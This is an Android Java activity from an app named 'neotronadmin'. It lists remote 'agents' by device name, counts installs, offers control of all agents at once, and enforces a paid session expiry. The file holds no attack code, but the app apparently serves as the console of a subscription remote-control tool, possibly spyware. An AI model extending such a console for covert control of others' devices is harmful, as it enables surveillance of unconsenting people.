package com.pegalite.neotronadmin.ui;

import android.annotation.SuppressLint;
import android.app.AlertDialog;
import android.content.Intent;
import android.graphics.Color;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.view.View;

import androidx.annotation.Nullable;

import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;
import com.pegalite.neotronadmin.R;
import com.pegalite.neotronadmin.components.adapters.AgentsAdapter;
import com.pegalite.neotronadmin.components.models.AgentModel;
import com.pegalite.neotronadmin.databinding.ActivityMainBinding;
import com.pegalite.neotronadmin.functions.helpers.Prefs;
import com.pegalite.neotronadmin.functions.server.req.RetrofitClient;
import com.pegalite.neotronadmin.functions.server.res.PegaCallback;
import com.pegalite.neotronadmin.functions.server.res.PegaResponseManager;
import com.pegalite.neotronadmin.functions.server.socket.PegaSocketServer;
import com.pegalite.neotronadmin.functions.utils.Utils;
import com.pegalite.neotronadmin.functions.viewmanagers.PegaAppCompatActivity;

import org.json.JSONArray;

import java.lang.reflect.Type;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class MainActivity extends PegaAppCompatActivity {

    ActivityMainBinding binding;
    Prefs prefs;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        binding = ActivityMainBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());

        setWindowThemeMain();
        setAsLastActivity();

        prefs = new Prefs(this);
        PegaSocketServer.init(this, getPackageName());

        if (Utils.exp == null) {
            finishAffinity();
            return;
        }

        loadDevices();

        setUpCountDown();
    }


    @SuppressLint("SetTextI18n")
    private void loadDevices() {
        RetrofitClient.getInstance(this).getApiInterfaces().getAgents().enqueue(new PegaResponseManager(new PegaCallback(this, true) {
            @Override
            public void onSuccess(@Nullable JSONArray data) {
                if (data == null) {
                    return;
                }

                Type listType = new TypeToken<List<AgentModel>>() {
                }.getType();

                List<AgentModel> agentModelList = new Gson().fromJson(data.toString(), listType);
                Utils.agentModelList = agentModelList;
                AgentsAdapter agentsAdapter = new AgentsAdapter(agentModelList, MainActivity.this);
                binding.recyclerView.setAdapter(agentsAdapter);
                binding.totalInstalls.setText(agentModelList.size() + "");
                Utils.agentAddedListener = (agentID, adminID, agentName, deviceName) -> runOnUiThread(() -> {
                    agentModelList.add(0, new AgentModel(agentID, adminID, agentName, deviceName, true));
                    agentsAdapter.notifyItemInserted(0);
                });
                binding.controlAll.setOnClickListener(v -> openActivityWithRightAnim(new Intent(MainActivity.this, ViewDeviceActivity.class).putExtra("deviceName", "Control All Agents").putExtra("agentID", "all")));
            }

        }));
    }

    @SuppressLint("SetTextI18n")
    private void setUpCountDown() {
        SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy HH:mm", Locale.getDefault());

        try {
            Date futureDate = sdf.parse(Utils.exp);
            long futureMillis = futureDate != null ? futureDate.getTime() : 0;
            long currentMillis = System.currentTimeMillis();
            long remainingTime = futureMillis - currentMillis;

            if (remainingTime > 0) {
                new CountDownTimer(remainingTime, 1000) {
                    public void onTick(long millisUntilFinished) {
                        long seconds = (millisUntilFinished / 1000) % 60;
                        long minutes = (millisUntilFinished / (1000 * 60)) % 60;
                        long hours = (millisUntilFinished / (1000 * 60 * 60)) % 24;
                        long days = (millisUntilFinished / (1000 * 60 * 60 * 24));

                        String time = String.format(Locale.getDefault(), "%02d days %02d:%02d:%02d", days, hours, minutes, seconds);
                        binding.exp.setText(time);
                    }

                    public void onFinish() {
                        binding.exp.setText("Time's up!");
                        binding.exp.setTextColor(Color.RED);
                        expired();
                    }
                }.start();
            } else {
                binding.exp.setText("Date is in the past.");
                binding.exp.setTextColor(Color.RED);
                expired();
            }

        } catch (Exception e) {
            binding.exp.setText("Invalid date format.");
            expired();
        }
    }

    private void expired() {
        new AlertDialog.Builder(MainActivity.this, R.style.alertDialog).setTitle("Time's up!").setMessage("Your session has expired. Please renew to continue.").setCancelable(false).setPositiveButton("Exit", (dialog, which) -> {
            dialog.dismiss();
            finishAffinity();
        }).show();
    }
}
